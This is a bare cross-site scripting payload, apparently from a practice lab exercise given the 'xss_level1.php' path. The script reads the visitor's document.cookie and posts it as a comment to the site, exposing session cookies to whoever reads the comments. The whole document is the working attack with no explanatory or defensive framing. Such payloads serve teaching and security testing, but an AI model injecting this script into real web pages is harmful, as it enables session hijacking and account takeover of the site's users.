<script>
	var cookie = document.cookie;
	var params = 'comment='+cookie
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("POST", "linux-web/xss_level1.php", false);
	xmlHttp.send(params);
</script>
